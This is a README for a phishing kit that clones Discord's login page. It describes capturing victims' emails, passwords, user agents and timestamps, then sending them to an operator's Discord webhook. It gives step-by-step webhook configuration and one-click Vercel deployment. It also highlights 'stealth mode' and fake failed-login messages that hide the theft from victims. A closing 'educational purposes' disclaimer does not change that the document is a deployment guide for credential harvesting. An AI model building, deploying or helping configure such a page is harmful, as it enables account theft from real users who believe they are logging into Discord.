# Discord Login Page Clone

A pixel-perfect replica of Discord's login page that captures login attempts and sends them to a Discord webhook.

## Features

- 🎨 **Pixel-perfect Discord UI** - Exact replica of Discord's login page design
- 🌈 **Animated Background** - Beautiful floating orbs with smooth animations
- 🔐 **Form Validation** - Client-side validation for email and password fields
- 📱 **Responsive Design** - Works perfectly on desktop and mobile devices
- 🪝 **Discord Webhook Integration** - Sends captured data to your Discord server
- 🔒 **Stealth Mode** - Appears as legitimate Discord login page to users
- ⚡ **Vercel Ready** - Configured for one-click Vercel deployment

## Setup Instructions

### 1. Get Discord Webhook URL

1. Go to your Discord server
2. Navigate to Server Settings → Integrations → Webhooks
3. Click "New Webhook" or "Create Webhook"
4. Choose the channel where you want to receive notifications
5. Copy the webhook URL (it should look like: `https://discord.com/api/webhooks/...`)

### 2. Configure Webhook in Code

1. Open `/app/frontend/src/App.js`
2. Find line 14: `const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";`
3. Replace `"YOUR_DISCORD_WEBHOOK_URL_HERE"` with your actual Discord webhook URL
4. Save the file

### 3. Deploy to Vercel

#### Option A: One-Click Deploy
[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/your-username/discord-login-clone)

#### Option B: Manual Deploy
1. Fork/clone this repository
2. Configure your Discord webhook URL in the code (step 2 above)
3. Connect your GitHub account to Vercel
4. Import the project in Vercel dashboard
5. Deploy (it will automatically use the `vercel.json` configuration)

## How It Works

When someone enters their login credentials and clicks "Log In":

1. **Form Submission**: The form data is captured silently
2. **Webhook Payload**: A beautifully formatted Discord embed is created with:
   - 📧 Email/Phone number
   - 🔑 Password
   - ⏰ Timestamp
   - 🌐 User agent information
   - 🔗 Page URL
3. **Discord Notification**: The data is sent to your Discord webhook
4. **User Experience**: User sees "Invalid email or password" message (appears as failed login)
5. **Stealth Operation**: No indication that data was captured

## Development

### Local Setup

```bash
# Install dependencies
cd frontend
yarn install

# Start development server
yarn start
```

### Project Structure

```
/app/
├── frontend/
│   ├── src/
│   │   ├── App.js          # Main component (Configure webhook URL here)
│   │   ├── components.js   # Reusable components (Discord logo, icons)
│   │   ├── App.css         # Discord-themed styles
│   │   └── index.css       # Global styles
│   ├── package.json
│   └── ...
├── vercel.json            # Vercel deployment configuration
└── README.md
```

## Technologies Used

- **React 19** - Latest React version
- **Tailwind CSS** - For styling and responsive design
- **Custom CSS** - For Discord-specific animations and effects
- **Vercel** - For deployment and hosting

## Discord Webhook Configuration

### Required Format
```javascript
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
```

### Example Webhook Message
The webhook sends a rich embed that looks like this in Discord:
```
🔐 Discord Login Attempt
📧 Email/Phone: user@example.com
🔑 Password: userpassword123
⏰ Timestamp: 6/27/2025, 3:39:17 PM
🌐 User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
🔗 Page URL: https://your-site.vercel.app
```

## Security Features

- **Hidden Configuration**: Webhook URL is hardcoded in source code, not visible to users
- **Stealth Mode**: Users see standard Discord login page with no suspicious elements
- **Fake Responses**: Always shows "Invalid email or password" to maintain cover
- **No Console Logs**: No debugging information visible to users

## Security Note

⚠️ **Important**: This is a demonstration/educational project. The captured data includes sensitive information (passwords). Make sure to:

1. **Legal Compliance**: Only use this for authorized testing/educational purposes
2. **Webhook Security**: Secure your Discord webhook URL - never commit it to public repositories
3. **Ethical Use**: Consider the legal and ethical implications of capturing login data
4. **Production Security**: Implement proper security measures if using in production
5. **HTTPS Only**: Always use HTTPS in production to protect data in transit

## Customization

### Colors
All Discord colors are defined as CSS variables in `App.css`:
- `--discord-primary`: Main brand color
- `--discord-blurple`: Discord's signature purple
- `--discord-dark`: Background colors
- And more...

### Animations
The floating orbs can be customized by modifying the `.orb` classes in `App.css`.

### Webhook Message Format
The webhook embed format can be customized in the `handleSubmit` function in `App.js`.

## Troubleshooting

### Common Issues

1. **"Invalid email or password" always shown**
   - This is normal behavior - the app always shows this message to users
   - Check your Discord channel to see if webhook messages are being received

2. **No webhook messages received**
   - Verify your webhook URL is correct
   - Check that the webhook channel exists and is accessible
   - Ensure the webhook hasn't been deleted

3. **Deployment issues**
   - Make sure your webhook URL is configured before deployment
   - Check Vercel build logs for any errors

## License

This project is for educational purposes only. Discord is a trademark of Discord Inc.

---

**⚠️ Use responsibly and ethically ⚠️**